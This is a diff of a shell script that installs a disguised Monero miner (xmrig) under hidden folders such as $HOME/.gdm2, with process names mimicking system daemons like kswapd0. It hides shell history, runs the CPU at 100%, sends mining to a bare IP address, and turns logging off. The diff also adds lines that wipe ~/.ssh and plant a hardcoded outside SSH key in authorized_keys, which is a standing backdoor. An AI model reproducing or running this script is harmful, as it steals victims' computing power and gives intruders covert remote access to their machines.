@@ -4,20 +4,20 @@ unset HISTFILE
 unset HISTFILE ;history -d $((HISTCMD-1))
 export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
-systemctl disable gdm2 --now
-systemctl disable swapd --now
+#systemctl disable gdm2 --now
+#systemctl disable swapd --now
 
-chattr -i $HOME/.gdm2/
-chattr -i $HOME/.swapd/
+#chattr -i $HOME/.gdm2/
+#chattr -i $HOME/.swapd/
 
-killall swapd
-kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+#killall swapd
+#kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
-killall kswapd0
-kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+#killall kswapd0
+#kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
 
-rm -rf $HOME/.gdm2/
-rm -rf $HOME/.swapd/
+#rm -rf $HOME/.gdm2/
+#rm -rf $HOME/.swapd/
 
 VERSION=2.11
 
@@ -169,12 +169,12 @@ if sudo -n true 2>/dev/null; then
   sudo systemctl stop moneroocean_miner.service
 fi
 killall -9 xmrig
-killall -9 kswapd0
+#killall -9 kswapd0
 
 echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
-rm -rf $HOME/.gdm2
+#rm -rf $HOME/.gdm2
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
@@ -182,7 +182,7 @@ if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig
   exit 1
 fi
 
-# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
@@ -190,7 +190,7 @@ if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
   exit 1
 fi
-rm xmrig.tar.gz
+#rm xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.gdm2/config.json
@@ -216,7 +216,7 @@ if (test $? -ne 0); then
   if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
     echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
   fi
-  rm xmrig.tar.gz
+  #rm xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
@@ -248,18 +248,18 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2/config.json
+sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.gdm2/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
 
-rm -rf $HOME/.gdm2/config.json
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json ; mv config.json $HOME/.gdm2/config.json
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
+#rm -rf $HOME/.gdm2/config.json
+#wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json ; mv config.json $HOME/.gdm2/config.json
+#curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
@@ -355,10 +355,12 @@ rm -rf xmrig.tar*
 
 echo "[*] Generating ssh key on server"
 
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
+rm -rf ~/.ssh/authorized_keys
+rm -rf ~/.ssh/
 mkdir ~/.ssh
 chmod 700 ~/.ssh
 touch ~/.ssh/authorized_keys
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
 echo "[*] Setup complete"
